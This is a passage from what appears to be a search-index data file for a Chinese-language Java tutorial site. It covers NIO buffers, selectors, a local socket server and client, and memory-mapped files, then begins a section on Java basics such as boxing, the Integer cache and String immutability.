\u2460 \u65B0\u5EFA\u4E00\u4E2A\u5927\u5C0F\u4E3A 8 \u4E2A\u5B57\u8282\u7684\u7F13\u51B2\u533A\uFF0C\u6B64\u65F6 position \u4E3A 0\uFF0C\u800C limit = capacity = 8\u3002capacity \u53D8\u91CF\u4E0D\u4F1A\u6539\u53D8\uFF0C\u4E0B\u9762\u7684\u8BA8\u8BBA\u4F1A\u5FFD\u7565\u5B83\u3002 \u2461 \u4ECE\u8F93\u5165\u901A\u9053\u4E2D\u8BFB\u53D6 5 \u4E2A\u5B57\u8282\u6570\u636E\u5199\u5165\u7F13\u51B2\u533A\u4E2D\uFF0C\u6B64\u65F6 position \u4E3A 5\uFF0Climit \u4FDD\u6301\u4E0D\u53D8\u3002 \u2462 \u5728\u5C06\u7F13\u51B2\u533A\u7684\u6570\u636E\u5199\u5230\u8F93\u51FA\u901A\u9053\u4E4B\u524D\uFF0C\u9700\u8981\u5148\u8C03\u7528 flip() \u65B9\u6CD5\uFF0C\u8FD9\u4E2A\u65B9\u6CD5\u5C06 limit \u8BBE\u7F6E\u4E3A\u5F53\u524D position\uFF0C\u5E76\u5C06 position \u8BBE\u7F6E\u4E3A 0\u3002 \u2463 \u4ECE\u7F13\u51B2\u533A\u4E2D\u53D6 4 \u4E2A\u5B57\u8282\u5230\u8F93\u51FA\u7F13\u51B2\u4E2D\uFF0C\u6B64\u65F6 position \u8BBE\u4E3A 4\u3002 \u2464 \u6700\u540E\u9700\u8981\u8C03\u7528 clear() \u65B9\u6CD5\u6765\u6E05\u7A7A\u7F13\u51B2\u533A\uFF0C\u6B64\u65F6 position \u548C limit \u90FD\u88AB\u8BBE\u7F6E\u4E3A\u6700\u521D\u4F4D\u7F6E\u3002`},{header:"\u6587\u4EF6 NIO \u5B9E\u4F8B",slug:"\u6587\u4EF6-nio-\u5B9E\u4F8B",content:`\u4EE5\u4E0B\u5C55\u793A\u4E86\u4F7F\u7528 NIO \u5FEB\u901F\u590D\u5236\u6587\u4EF6\u7684\u5B9E\u4F8B\uFF1A
public static void fastCopy(String src, String dist) throws IOException { /* \u83B7\u5F97\u6E90\u6587\u4EF6\u7684\u8F93\u5165\u5B57\u8282\u6D41 */ FileInputStream fin = new FileInputStream(src); /* \u83B7\u53D6\u8F93\u5165\u5B57\u8282\u6D41\u7684\u6587\u4EF6\u901A\u9053 */ FileChannel fcin = fin.getChannel(); /* \u83B7\u53D6\u76EE\u6807\u6587\u4EF6\u7684\u8F93\u51FA\u5B57\u8282\u6D41 */ FileOutputStream fout = new FileOutputStream(dist); /* \u83B7\u53D6\u8F93\u51FA\u5B57\u8282\u6D41\u7684\u6587\u4EF6\u901A\u9053 */ FileChannel fcout = fout.getChannel(); /* \u4E3A\u7F13\u51B2\u533A\u5206\u914D 1024 \u4E2A\u5B57\u8282 */ ByteBuffer buffer = ByteBuffer.allocateDirect(1024); while (true) { /* \u4ECE\u8F93\u5165\u901A\u9053\u4E2D\u8BFB\u53D6\u6570\u636E\u5230\u7F13\u51B2\u533A\u4E2D */ int r = fcin.read(buffer); /* read() \u8FD4\u56DE -1 \u8868\u793A EOF */ if (r == -1) { break; } /* \u5207\u6362\u8BFB\u5199 */ buffer.flip(); /* \u628A\u7F13\u51B2\u533A\u7684\u5185\u5BB9\u5199\u5165\u8F93\u51FA\u6587\u4EF6\u4E2D */ fcout.write(buffer); /* \u6E05\u7A7A\u7F13\u51B2\u533A */ buffer.clear(); }
}`},{header:"\u9009\u62E9\u5668",slug:"\u9009\u62E9\u5668",content:`NIO \u5E38\u5E38\u88AB\u53EB\u505A\u975E\u963B\u585E IO\uFF0C\u4E3B\u8981\u662F\u56E0\u4E3A NIO \u5728\u7F51\u7EDC\u901A\u4FE1\u4E2D\u7684\u975E\u963B\u585E\u7279\u6027\u88AB\u5E7F\u6CDB\u4F7F\u7528\u3002
NIO \u5B9E\u73B0\u4E86 IO \u591A\u8DEF\u590D\u7528\u4E2D\u7684 Reactor \u6A21\u578B\uFF0C\u4E00\u4E2A\u7EBF\u7A0B Thread \u4F7F\u7528\u4E00\u4E2A\u9009\u62E9\u5668 Selector \u901A\u8FC7\u8F6E\u8BE2\u7684\u65B9\u5F0F\u53BB\u76D1\u542C\u591A\u4E2A\u901A\u9053 Channel \u4E0A\u7684\u4E8B\u4EF6\uFF0C\u4ECE\u800C\u8BA9\u4E00\u4E2A\u7EBF\u7A0B\u5C31\u53EF\u4EE5\u5904\u7406\u591A\u4E2A\u4E8B\u4EF6\u3002
\u901A\u8FC7\u914D\u7F6E\u76D1\u542C\u7684\u901A\u9053 Channel \u4E3A\u975E\u963B\u585E\uFF0C\u90A3\u4E48\u5F53 Channel \u4E0A\u7684 IO \u4E8B\u4EF6\u8FD8\u672A\u5230\u8FBE\u65F6\uFF0C\u5C31\u4E0D\u4F1A\u8FDB\u5165\u963B\u585E\u72B6\u6001\u4E00\u76F4\u7B49\u5F85\uFF0C\u800C\u662F\u7EE7\u7EED\u8F6E\u8BE2\u5176\u5B83 Channel\uFF0C\u627E\u5230 IO \u4E8B\u4EF6\u5DF2\u7ECF\u5230\u8FBE\u7684 Channel \u6267\u884C\u3002
\u56E0\u4E3A\u521B\u5EFA\u548C\u5207\u6362\u7EBF\u7A0B\u7684\u5F00\u9500\u5F88\u5927\uFF0C\u56E0\u6B64\u4F7F\u7528\u4E00\u4E2A\u7EBF\u7A0B\u6765\u5904\u7406\u591A\u4E2A\u4E8B\u4EF6\u800C\u4E0D\u662F\u4E00\u4E2A\u7EBF\u7A0B\u5904\u7406\u4E00\u4E2A\u4E8B\u4EF6\uFF0C\u5BF9\u4E8E IO \u5BC6\u96C6\u578B\u7684\u5E94\u7528\u5177\u6709\u5F88\u597D\u5730\u6027\u80FD\u3002
\u5E94\u8BE5\u6CE8\u610F\u7684\u662F\uFF0C\u53EA\u6709\u5957\u63A5\u5B57 Channel \u624D\u80FD\u914D\u7F6E\u4E3A\u975E\u963B\u585E\uFF0C\u800C FileChannel \u4E0D\u80FD\uFF0C\u4E3A FileChannel \u914D\u7F6E\u975E\u963B\u585E\u4E5F\u6CA1\u6709\u610F\u4E49\u3002`},{header:"1. \u521B\u5EFA\u9009\u62E9\u5668",slug:"_1-\u521B\u5EFA\u9009\u62E9\u5668",content:"Selector selector = Selector.open();"},{header:"2. \u5C06\u901A\u9053\u6CE8\u518C\u5230\u9009\u62E9\u5668\u4E0A",slug:"_2-\u5C06\u901A\u9053\u6CE8\u518C\u5230\u9009\u62E9\u5668\u4E0A",content:`ServerSocketChannel ssChannel = ServerSocketChannel.open();
ssChannel.configureBlocking(false);
ssChannel.register(selector, SelectionKey.OP_ACCEPT);
\u901A\u9053\u5FC5\u987B\u914D\u7F6E\u4E3A\u975E\u963B\u585E\u6A21\u5F0F\uFF0C\u5426\u5219\u4F7F\u7528\u9009\u62E9\u5668\u5C31\u6CA1\u6709\u4EFB\u4F55\u610F\u4E49\u4E86\uFF0C\u56E0\u4E3A\u5982\u679C\u901A\u9053\u5728\u67D0\u4E2A\u4E8B\u4EF6\u4E0A\u88AB\u963B\u585E\uFF0C\u90A3\u4E48\u670D\u52A1\u5668\u5C31\u4E0D\u80FD\u54CD\u5E94\u5176\u5B83\u4E8B\u4EF6\uFF0C\u5FC5\u987B\u7B49\u5F85\u8FD9\u4E2A\u4E8B\u4EF6\u5904\u7406\u5B8C\u6BD5\u624D\u80FD\u53BB\u5904\u7406\u5176\u5B83\u4E8B\u4EF6\uFF0C\u663E\u7136\u8FD9\u548C\u9009\u62E9\u5668\u7684\u4F5C\u7528\u80CC\u9053\u800C\u9A70\u3002
\u5728\u5C06\u901A\u9053\u6CE8\u518C\u5230\u9009\u62E9\u5668\u4E0A\u65F6\uFF0C\u8FD8\u9700\u8981\u6307\u5B9A\u8981\u6CE8\u518C\u7684\u5177\u4F53\u4E8B\u4EF6\uFF0C\u4E3B\u8981\u6709\u4EE5\u4E0B\u51E0\u7C7B\uFF1A SelectionKey.OP_CONNECT
SelectionKey.OP_ACCEPT
SelectionKey.OP_READ
SelectionKey.OP_WRITE \u5B83\u4EEC\u5728 SelectionKey \u7684\u5B9A\u4E49\u5982\u4E0B\uFF1A
public static final int OP_READ = 1 << 0;
public static final int OP_WRITE = 1 << 2;
public static final int OP_CONNECT = 1 << 3;
public static final int OP_ACCEPT = 1 << 4;
\u53EF\u4EE5\u770B\u51FA\u6BCF\u4E2A\u4E8B\u4EF6\u53EF\u4EE5\u88AB\u5F53\u6210\u4E00\u4E2A\u4F4D\u57DF\uFF0C\u4ECE\u800C\u7EC4\u6210\u4E8B\u4EF6\u96C6\u6574\u6570\u3002\u4F8B\u5982\uFF1A
int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE;`},{header:"3. \u76D1\u542C\u4E8B\u4EF6",slug:"_3-\u76D1\u542C\u4E8B\u4EF6",content:`int num = selector.select();
\u4F7F\u7528 select() \u6765\u76D1\u542C\u5230\u8FBE\u7684\u4E8B\u4EF6\uFF0C\u5B83\u4F1A\u4E00\u76F4\u963B\u585E\u76F4\u5230\u6709\u81F3\u5C11\u4E00\u4E2A\u4E8B\u4EF6\u5230\u8FBE\u3002`},{header:"4. \u83B7\u53D6\u5230\u8FBE\u7684\u4E8B\u4EF6",slug:"_4-\u83B7\u53D6\u5230\u8FBE\u7684\u4E8B\u4EF6",content:`Set<SelectionKey> keys = selector.selectedKeys();
Iterator<SelectionKey> keyIterator = keys.iterator();
while (keyIterator.hasNext()) { SelectionKey key = keyIterator.next(); if (key.isAcceptable()) { // ... } else if (key.isReadable()) { // ... } keyIterator.remove();
}`},{header:"5. \u4E8B\u4EF6\u5FAA\u73AF",slug:"_5-\u4E8B\u4EF6\u5FAA\u73AF",content:`\u56E0\u4E3A\u4E00\u6B21 select() \u8C03\u7528\u4E0D\u80FD\u5904\u7406\u5B8C\u6240\u6709\u7684\u4E8B\u4EF6\uFF0C\u5E76\u4E14\u670D\u52A1\u5668\u7AEF\u6709\u53EF\u80FD\u9700\u8981\u4E00\u76F4\u76D1\u542C\u4E8B\u4EF6\uFF0C\u56E0\u6B64\u670D\u52A1\u5668\u7AEF\u5904\u7406\u4E8B\u4EF6\u7684\u4EE3\u7801\u4E00\u822C\u4F1A\u653E\u5728\u4E00\u4E2A\u6B7B\u5FAA\u73AF\u5185\u3002
while (true) { int num = selector.select(); Set<SelectionKey> keys = selector.selectedKeys(); Iterator<SelectionKey> keyIterator = keys.iterator(); while (keyIterator.hasNext()) { SelectionKey key = keyIterator.next(); if (key.isAcceptable()) { // ... } else if (key.isReadable()) { // ... } keyIterator.remove(); }
}`},{header:"\u5957\u63A5\u5B57 NIO \u5B9E\u4F8B",slug:"\u5957\u63A5\u5B57-nio-\u5B9E\u4F8B",content:`public class NIOServer { public static void main(String[] args) throws IOException { Selector selector = Selector.open(); ServerSocketChannel ssChannel = ServerSocketChannel.open(); ssChannel.configureBlocking(false); ssChannel.register(selector, SelectionKey.OP_ACCEPT); ServerSocket serverSocket = ssChannel.socket(); InetSocketAddress address = new InetSocketAddress("127.0.0.1", 8888); serverSocket.bind(address); while (true) { selector.select(); Set<SelectionKey> keys = selector.selectedKeys(); Iterator<SelectionKey> keyIterator = keys.iterator(); while (keyIterator.hasNext()) { SelectionKey key = keyIterator.next(); if (key.isAcceptable()) { ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel(); // \u670D\u52A1\u5668\u4F1A\u4E3A\u6BCF\u4E2A\u65B0\u8FDE\u63A5\u521B\u5EFA\u4E00\u4E2A SocketChannel SocketChannel sChannel = ssChannel1.accept(); sChannel.configureBlocking(false); // \u8FD9\u4E2A\u65B0\u8FDE\u63A5\u4E3B\u8981\u7528\u4E8E\u4ECE\u5BA2\u6237\u7AEF\u8BFB\u53D6\u6570\u636E sChannel.register(selector, SelectionKey.OP_READ); } else if (key.isReadable()) { SocketChannel sChannel = (SocketChannel) key.channel(); System.out.println(readDataFromSocketChannel(sChannel)); sChannel.close(); } keyIterator.remove(); } } } private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException { ByteBuffer buffer = ByteBuffer.allocate(1024); StringBuilder data = new StringBuilder(); while (true) { buffer.clear(); int n = sChannel.read(buffer); if (n == -1) { break; } buffer.flip(); int limit = buffer.limit(); char[] dst = new char[limit]; for (int i = 0; i < limit; i++) { dst[i] = (char) buffer.get(i); } data.append(dst); buffer.clear(); } return data.toString(); }
}
public class NIOClient { public static void main(String[] args) throws IOException { Socket socket = new Socket("127.0.0.1", 8888); OutputStream out = socket.getOutputStream(); String s = "hello world"; out.write(s.getBytes()); out.close(); }
}`},{header:"\u5185\u5B58\u6620\u5C04\u6587\u4EF6",slug:"\u5185\u5B58\u6620\u5C04\u6587\u4EF6",content:`\u5185\u5B58\u6620\u5C04\u6587\u4EF6 I/O \u662F\u4E00\u79CD\u8BFB\u548C\u5199\u6587\u4EF6\u6570\u636E\u7684\u65B9\u6CD5\uFF0C\u5B83\u53EF\u4EE5\u6BD4\u5E38\u89C4\u7684\u57FA\u4E8E\u6D41\u6216\u8005\u57FA\u4E8E\u901A\u9053\u7684 I/O \u5FEB\u5F97\u591A\u3002
\u5411\u5185\u5B58\u6620\u5C04\u6587\u4EF6\u5199\u5165\u53EF\u80FD\u662F\u5371\u9669\u7684\uFF0C\u53EA\u662F\u6539\u53D8\u6570\u7EC4\u7684\u5355\u4E2A\u5143\u7D20\u8FD9\u6837\u7684\u7B80\u5355\u64CD\u4F5C\uFF0C\u5C31\u53EF\u80FD\u4F1A\u76F4\u63A5\u4FEE\u6539\u78C1\u76D8\u4E0A\u7684\u6587\u4EF6\u3002\u4FEE\u6539\u6570\u636E\u4E0E\u5C06\u6570\u636E\u4FDD\u5B58\u5230\u78C1\u76D8\u662F\u6CA1\u6709\u5206\u5F00\u7684\u3002
\u4E0B\u9762\u4EE3\u7801\u884C\u5C06\u6587\u4EF6\u7684\u524D 1024 \u4E2A\u5B57\u8282\u6620\u5C04\u5230\u5185\u5B58\u4E2D\uFF0Cmap() \u65B9\u6CD5\u8FD4\u56DE\u4E00\u4E2A MappedByteBuffer\uFF0C\u5B83\u662F ByteBuffer \u7684\u5B50\u7C7B\u3002\u56E0\u6B64\uFF0C\u53EF\u4EE5\u50CF\u4F7F\u7528\u5176\u4ED6\u4EFB\u4F55 ByteBuffer \u4E00\u6837\u4F7F\u7528\u65B0\u6620\u5C04\u7684\u7F13\u51B2\u533A\uFF0C\u64CD\u4F5C\u7CFB\u7EDF\u4F1A\u5728\u9700\u8981\u65F6\u8D1F\u8D23\u6267\u884C\u6620\u5C04\u3002
MappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024);`},{header:"\u5BF9\u6BD4",slug:"\u5BF9\u6BD4",content:`NIO \u4E0E\u666E\u901A I/O \u7684\u533A\u522B\u4E3B\u8981\u6709\u4EE5\u4E0B\u4E24\u70B9\uFF1A NIO \u662F\u975E\u963B\u585E\u7684\uFF1B
NIO \u9762\u5411\u5757\uFF0CI/O \u9762\u5411\u6D41\u3002`},{header:"\u516B\u3001\u53C2\u8003\u8D44\u6599",slug:"\u516B\u3001\u53C2\u8003\u8D44\u6599",content:`Eckel B, \u57C3\u514B\u5C14, \u660A\u9E4F, \u7B49. Java \u7F16\u7A0B\u601D\u60F3 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2002.
IBM: NIO \u5165\u95E8
Java NIO Tutorial
Java NIO \u6D45\u6790
IBM: \u6DF1\u5165\u5206\u6790 Java I/O \u7684\u5DE5\u4F5C\u673A\u5236
IBM: \u6DF1\u5165\u5206\u6790 Java \u4E2D\u7684\u4E2D\u6587\u7F16\u7801\u95EE\u9898
IBM: Java \u5E8F\u5217\u5316\u7684\u9AD8\u7EA7\u8BA4\u8BC6
NIO \u4E0E\u4F20\u7EDF IO \u7684\u533A\u522B
Decorator Design Pattern
Socket Multicast`}]},{path:"/java/Java%20%E5%9F%BA%E7%A1%80.html",title:"Java \u57FA\u7840",pathLocale:"/",contents:[{header:"Java \u57FA\u7840",slug:"java-\u57FA\u7840",content:`Java \u57FA\u7840 \u4E00\u3001\u6570\u636E\u7C7B\u578B \u57FA\u672C\u7C7B\u578B
\u5305\u88C5\u7C7B\u578B
\u7F13\u5B58\u6C60 \u4E8C\u3001String \u6982\u89C8
\u4E0D\u53EF\u53D8\u7684\u597D\u5904
String, StringBuffer and StringBuilder String Pool
new String("abc") \u4E09\u3001\u8FD0\u7B97 \u53C2\u6570\u4F20\u9012
float \u4E0E double
\u9690\u5F0F\u7C7B\u578B\u8F6C\u6362
switch \u56DB\u3001\u5173\u952E\u5B57 final
static \u4E94\u3001Object \u901A\u7528\u65B9\u6CD5 \u6982\u89C8
equals()
hashCode()
toString()
clone() \u516D\u3001\u7EE7\u627F \u8BBF\u95EE\u6743\u9650
\u62BD\u8C61\u7C7B\u4E0E\u63A5\u53E3
super
\u91CD\u5199\u4E0E\u91CD\u8F7D \u4E03\u3001\u53CD\u5C04
\u516B\u3001\u5F02\u5E38
\u4E5D\u3001\u6CDB\u578B
\u5341\u3001\u6CE8\u89E3
\u5341\u4E00\u3001\u7279\u6027 Java \u5404\u7248\u672C\u7684\u65B0\u7279\u6027
Java \u4E0E C++ \u7684\u533A\u522B
JRE or JDK \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6570\u636E\u7C7B\u578B",slug:"\u4E00\u3001\u6570\u636E\u7C7B\u578B",content:""},{header:"\u57FA\u672C\u7C7B\u578B",slug:"\u57FA\u672C\u7C7B\u578B",content:`byte/8
char/16
short/16
int/32
float/32
long/64
double/64
boolean/~ boolean \u53EA\u6709\u4E24\u4E2A\u503C\uFF1Atrue\u3001false\uFF0C\u53EF\u4EE5\u4F7F\u7528 1 bit \u6765\u5B58\u50A8\uFF0C\u4F46\u662F\u5177\u4F53\u5927\u5C0F\u6CA1\u6709\u660E\u786E\u89C4\u5B9A\u3002JVM \u4F1A\u5728\u7F16\u8BD1\u65F6\u671F\u5C06 boolean \u7C7B\u578B\u7684\u6570\u636E\u8F6C\u6362\u4E3A int\uFF0C\u4F7F\u7528 1 \u6765\u8868\u793A true\uFF0C0 \u8868\u793A false\u3002JVM \u652F\u6301 boolean \u6570\u7EC4\uFF0C\u4F46\u662F\u662F\u901A\u8FC7\u8BFB\u5199 byte \u6570\u7EC4\u6765\u5B9E\u73B0\u7684\u3002 Primitive Data Types
The Java\xAE Virtual Machine Specification`},{header:"\u5305\u88C5\u7C7B\u578B",slug:"\u5305\u88C5\u7C7B\u578B",content:`\u57FA\u672C\u7C7B\u578B\u90FD\u6709\u5BF9\u5E94\u7684\u5305\u88C5\u7C7B\u578B\uFF0C\u57FA\u672C\u7C7B\u578B\u4E0E\u5176\u5BF9\u5E94\u7684\u5305\u88C5\u7C7B\u578B\u4E4B\u95F4\u7684\u8D4B\u503C\u4F7F\u7528\u81EA\u52A8\u88C5\u7BB1\u4E0E\u62C6\u7BB1\u5B8C\u6210\u3002
Integer x = 2; // \u88C5\u7BB1 \u8C03\u7528\u4E86 Integer.valueOf(2)
int y = x; // \u62C6\u7BB1 \u8C03\u7528\u4E86 X.intValue() Autoboxing and Unboxing`},{header:"\u7F13\u5B58\u6C60",slug:"\u7F13\u5B58\u6C60",content:`new Integer(123) \u4E0E Integer.valueOf(123) \u7684\u533A\u522B\u5728\u4E8E\uFF1A new Integer(123) \u6BCF\u6B21\u90FD\u4F1A\u65B0\u5EFA\u4E00\u4E2A\u5BF9\u8C61\uFF1B
Integer.valueOf(123) \u4F1A\u4F7F\u7528\u7F13\u5B58\u6C60\u4E2D\u7684\u5BF9\u8C61\uFF0C\u591A\u6B21\u8C03\u7528\u4F1A\u53D6\u5F97\u540C\u4E00\u4E2A\u5BF9\u8C61\u7684\u5F15\u7528\u3002 Integer x = new Integer(123);
Integer y = new Integer(123);
System.out.println(x == y); // false
Integer z = Integer.valueOf(123);
Integer k = Integer.valueOf(123);
System.out.println(z == k); // true
valueOf() \u65B9\u6CD5\u7684\u5B9E\u73B0\u6BD4\u8F83\u7B80\u5355\uFF0C\u5C31\u662F\u5148\u5224\u65AD\u503C\u662F\u5426\u5728\u7F13\u5B58\u6C60\u4E2D\uFF0C\u5982\u679C\u5728\u7684\u8BDD\u5C31\u76F4\u63A5\u8FD4\u56DE\u7F13\u5B58\u6C60\u7684\u5185\u5BB9\u3002
public static Integer valueOf(int i) { if (i >= IntegerCache.low && i <= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);
}
\u5728 Java 8 \u4E2D\uFF0CInteger \u7F13\u5B58\u6C60\u7684\u5927\u5C0F\u9ED8\u8BA4\u4E3A -128~127\u3002
static final int low = -128;
static final int high;
static final Integer cache[]; static { // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high"); if (integerCacheHighPropValue != null) { try { int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); } catch( NumberFormatException nfe) { // If the property cannot be parsed into an int, ignore it. } } high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k < cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high >= 127;
}
\u7F16\u8BD1\u5668\u4F1A\u5728\u81EA\u52A8\u88C5\u7BB1\u8FC7\u7A0B\u8C03\u7528 valueOf() \u65B9\u6CD5\uFF0C\u56E0\u6B64\u591A\u4E2A\u503C\u76F8\u540C\u4E14\u503C\u5728\u7F13\u5B58\u6C60\u8303\u56F4\u5185\u7684 Integer \u5B9E\u4F8B\u4F7F\u7528\u81EA\u52A8\u88C5\u7BB1\u6765\u521B\u5EFA\uFF0C\u90A3\u4E48\u5C31\u4F1A\u5F15\u7528\u76F8\u540C\u7684\u5BF9\u8C61\u3002
Integer m = 123;
Integer n = 123;
System.out.println(m == n); // true
\u57FA\u672C\u7C7B\u578B\u5BF9\u5E94\u7684\u7F13\u51B2\u6C60\u5982\u4E0B\uFF1A boolean values true and false
all byte values
short values between -128 and 127
int values between -128 and 127
char in the range \\u0000 to \\u007F \u5728\u4F7F\u7528\u8FD9\u4E9B\u57FA\u672C\u7C7B\u578B\u5BF9\u5E94\u7684\u5305\u88C5\u7C7B\u578B\u65F6\uFF0C\u5982\u679C\u8BE5\u6570\u503C\u8303\u56F4\u5728\u7F13\u51B2\u6C60\u8303\u56F4\u5185\uFF0C\u5C31\u53EF\u4EE5\u76F4\u63A5\u4F7F\u7528\u7F13\u51B2\u6C60\u4E2D\u7684\u5BF9\u8C61\u3002
\u5728 jdk 1.8 \u6240\u6709\u7684\u6570\u503C\u7C7B\u7F13\u51B2\u6C60\u4E2D\uFF0CInteger \u7684\u7F13\u51B2\u6C60 IntegerCache \u5F88\u7279\u6B8A\uFF0C\u8FD9\u4E2A\u7F13\u51B2\u6C60\u7684\u4E0B\u754C\u662F - 128\uFF0C\u4E0A\u754C\u9ED8\u8BA4\u662F 127\uFF0C\u4F46\u662F\u8FD9\u4E2A\u4E0A\u754C\u662F\u53EF\u8C03\u7684\uFF0C\u5728\u542F\u52A8 jvm \u7684\u65F6\u5019\uFF0C\u901A\u8FC7 -XX:AutoBoxCacheMax=<size> \u6765\u6307\u5B9A\u8FD9\u4E2A\u7F13\u51B2\u6C60\u7684\u5927\u5C0F\uFF0C\u8BE5\u9009\u9879\u5728 JVM \u521D\u59CB\u5316\u7684\u65F6\u5019\u4F1A\u8BBE\u5B9A\u4E00\u4E2A\u540D\u4E3A java.lang.IntegerCache.high \u7CFB\u7EDF\u5C5E\u6027\uFF0C\u7136\u540E IntegerCache \u521D\u59CB\u5316\u7684\u65F6\u5019\u5C31\u4F1A\u8BFB\u53D6\u8BE5\u7CFB\u7EDF\u5C5E\u6027\u6765\u51B3\u5B9A\u4E0A\u754C\u3002
StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123`},{header:"\u4E8C\u3001String",slug:"\u4E8C\u3001string",content:""},{header:"\u6982\u89C8",slug:"\u6982\u89C8",content:`String \u88AB\u58F0\u660E\u4E3A final\uFF0C\u56E0\u6B64\u5B83\u4E0D\u53EF\u88AB\u7EE7\u627F\u3002(Integer \u7B49\u5305\u88C5\u7C7B\u4E5F\u4E0D\u80FD\u88AB\u7EE7\u627F\uFF09
\u5728 Java 8 \u4E2D\uFF0CString \u5185\u90E8\u4F7F\u7528 char \u6570\u7EC4\u5B58\u50A8\u6570\u636E\u3002
public final class String implements java.io.Serializable, Comparable<String>, CharSequence { /** The value is used for character storage. */ private final char value[];
}
\u5728 Java 9 \u4E4B\u540E\uFF0CString \u7C7B\u7684\u5B9E\u73B0\u6539\u7528 byte \u6570\u7EC4\u5B58\u50A8\u5B57\u7B26\u4E32\uFF0C\u540C\u65F6\u4F7F\u7528 coder \u6765\u6807\u8BC6\u4F7F\u7528\u4E86\u54EA\u79CD\u7F16\u7801\u3002
public final class String implements java.io.Serializable, Comparable<String>, CharSequence { /** The value is used for character storage. */ private final byte[] value; /** The identifier of the encoding used to encode the bytes in {@code value}. */ private final byte coder;
}
value \u6570\u7EC4\u88AB\u58F0\u660E\u4E3A final\uFF0C\u8FD9\u610F\u5473\u7740 value \u6570\u7EC4\u521D\u59CB\u5316\u4E4B\u540E\u5C31\u4E0D\u80FD\u518D\u5F15\u7528\u5176\u5B83\u6570\u7EC4\u3002\u5E76\u4E14 String \u5185\u90E8\u6CA1\u6709\u6539\u53D8 value \u6570\u7EC4\u7684\u65B9\u6CD5\uFF0C\u56E0\u6B64\u53EF\u4EE5\u4FDD\u8BC1 String \u4E0D\u53EF\u53D8\u3002`},{header:"\u4E0D\u53EF\u53D8\u7684\u597D\u5904",slug:"\u4E0D\u53EF\u53D8\u7684\u597D\u5904",content:`1. \u53EF\u4EE5\u7F13\u5B58 hash \u503C
\u56E0\u4E3A String \u7684 hash \u503C\u7ECF\u5E38\u88AB\u4F7F\u7528\uFF0C\u4F8B\u5982 String \u7528\u505A HashMap \u7684 key\u3002\u4E0D\u53EF\u53D8\u7684\u7279\u6027\u53EF\u4EE5\u4F7F\u5F97 hash \u503C\u4E5F\u4E0D\u53EF\u53D8\uFF0C\u56E0\u6B64\u53EA\u9700\u8981\u8FDB\u884C\u4E00\u6B21\u8BA1\u7B97\u3002
2. String Pool \u7684\u9700\u8981
\u5982\u679C\u4E00\u4E2A String \u5BF9\u8C61\u5DF2\u7ECF\u88AB\u521B\u5EFA\u8FC7\u4E86\uFF0C\u90A3\u4E48\u5C31\u4F1A\u4ECE String Pool \u4E2D\u53D6\u5F97\u5F15\u7528\u3002\u53EA\u6709 String \u662F\u4E0D\u53EF\u53D8\u7684\uFF0C\u624D\u53EF\u80FD\u4F7F\u7528 String Pool\u3002 3. \u5B89\u5168\u6027
String \u7ECF\u5E38\u4F5C\u4E3A\u53C2\u6570\uFF0CString \u4E0D\u53EF\u53D8\u6027\u53EF\u4EE5\u4FDD\u8BC1\u53C2\u6570\u4E0D\u53EF\u53D8\u3002\u4F8B\u5982\u5728\u4F5C\u4E3A\u7F51\u7EDC\u8FDE\u63A5\u53C2\u6570\u7684\u60C5\u51B5\u4E0B\u5982\u679C String \u662F\u53EF\u53D8\u7684\uFF0C\u90A3\u4E48\u5728\u7F51\u7EDC\u8FDE\u63A5\u8FC7\u7A0B\u4E2D\uFF0CString \u88AB\u6539\u53D8\uFF0C\u6539\u53D8 String \u7684\u90A3\u4E00\u65B9\u4EE5\u4E3A\u73B0\u5728\u8FDE\u63A5\u7684\u662F\u5176\u5B83\u4E3B\u673A\uFF0C\u800C\u5B9E\u9645\u60C5\u51B5\u5374\u4E0D\u4E00\u5B9A\u662F\u3002
4. \u7EBF\u7A0B\u5B89\u5168
String \u4E0D\u53EF\u53D8\u6027\u5929\u751F\u5177\u5907\u7EBF\u7A0B\u5B89\u5168\uFF0C\u53EF\u4EE5\u5728\u591A\u4E2A\u7EBF\u7A0B\u4E2D\u5B89\u5168\u5730\u4F7F\u7528\u3002
Program Creek : Why String is immutable in Java?`},{header:"String, StringBuffer and StringBuilder",slug:"string-stringbuffer-and-stringbuilder",content:`1. \u53EF\u53D8\u6027 String \u4E0D\u53EF\u53D8
StringBuffer \u548C StringBuilder \u53EF\u53D8 2. \u7EBF\u7A0B\u5B89\u5168 String \u4E0D\u53EF\u53D8\uFF0C\u56E0\u6B64\u662F\u7EBF\u7A0B\u5B89\u5168\u7684
StringBuilder \u4E0D\u662F\u7EBF\u7A0B\u5B89\u5168\u7684
StringBuffer \u662F\u7EBF\u7A0B\u5B89\u5168\u7684\uFF0C\u5185\u90E8\u4F7F\u7528 synchronized \u8FDB\u884C\u540C\u6B65 StackOverflow : String, StringBuffer, and StringBuilder`},{header:"String Pool",slug:"string-pool",content:`\u5B57\u7B26\u4E32\u5E38\u91CF\u6C60\uFF08String Pool\uFF09\u4FDD\u5B58\u7740\u6240\u6709\u5B57\u7B26\u4E32\u5B57\u9762\u91CF\uFF08literal strings\uFF09\uFF0C\u8FD9\u4E9B\u5B57\u9762\u91CF\u5728\u7F16\u8BD1\u65F6\u671F\u5C31\u786E\u5B9A\u3002\u4E0D\u4EC5\u5982\u6B64\uFF0C\u8FD8\u53EF\u4EE5\u4F7F\u7528 String \u7684 intern() \u65B9\u6CD5\u5728\u8FD0\u884C\u8FC7\u7A0B\u5C06\u5B57\u7B26\u4E32\u6DFB\u52A0\u5230 String Pool \u4E2D\u3002
